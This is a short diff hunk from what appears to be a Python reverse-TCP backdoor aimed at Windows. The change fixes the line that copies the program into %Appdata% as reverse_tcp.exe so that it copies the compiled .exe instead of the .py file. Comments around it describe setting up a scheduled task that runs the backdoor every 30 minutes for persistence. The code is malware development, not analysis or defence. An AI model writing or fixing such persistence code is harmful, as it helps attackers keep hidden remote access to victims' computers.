@@ -81,8 +81,8 @@ if (platform.system() == "Windows"):
             # xml.close()
 
         ### Copy self to %Appdata% for Windows. (%Appdata%\reverse_tcp.exe)
-        print("copy " + current_path + " " + target_path)
-        os.system("copy " + current_path + " " + target_path)
+        ### current path is .py file(although we are running .exe file), so need to change it to .exe file extension.
+        os.system("copy " + current_path[:-2]+"exe" + " " + target_path)
 
         ### Setup schtasks for Windows.
         ### Run every 30 minutes.
